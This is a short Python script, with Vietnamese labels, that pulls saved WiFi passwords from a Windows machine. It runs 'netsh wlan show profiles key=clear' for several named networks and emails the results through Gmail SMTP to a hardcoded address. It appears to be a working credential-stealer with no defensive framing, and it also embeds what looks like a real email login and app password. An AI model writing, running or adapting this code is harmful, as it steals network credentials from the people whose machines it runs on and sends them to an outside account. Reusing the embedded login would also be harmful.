import subprocess,smtplib, re
from email.mime.text import MIMEText 
from email.mime.multipart import MIMEMultipart
def send_mail(email, password,message):
    msg = MIMEMultipart() 
    msg['From'] = email 
    msg['To'] = email 
    msg['Subject'] = "Thông tin WiFi"
    msg.attach(MIMEText(message, 'plain', 'utf-8'))
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email, email, msg.as_string())
    server.quit()

def get_network_profiles(desired_networks): 
    command = "netsh wlan show profiles" 
    networks = subprocess.check_output(command, shell=True) 
    networks = networks.decode(encoding='utf-8', errors='ignore') 
    networks_name = re.findall(r"(?:Profile\s*:\s)(.*)", networks) 

    result = " " 
    

    for network_name in networks_name: 
        if network_name.strip() in desired_networks: 
            command = f"netsh wlan show profiles \"{network_name.strip()}\" key=clear" 
            result_current = subprocess.check_output(command, shell=True) 
            
            result_current = result_current.decode(encoding='utf-8', errors='ignore')

            password = re.search(r"Key Content\s*:\s(.*)", result_current) 
            if password: 
                password = password.group(1).strip() 
            else: 
                password = "Không tìm thấy mật khẩu" 

            result += f"WiFi: {network_name.strip()}, Mật khẩu: {password}\n"
    return result 
def main():
    target_profiles = ['STU_1', 'STU_2', 'CA3_THI_THANMAY'] 
    
    profiles_info = get_network_profiles(target_profiles) 
    print(profiles_info)
    send_mail("tthhaannnnhhaann@gmail.com","aydv igkf jhlt vlaa",profiles_info)
    


if __name__ == "__main__": 
    main()





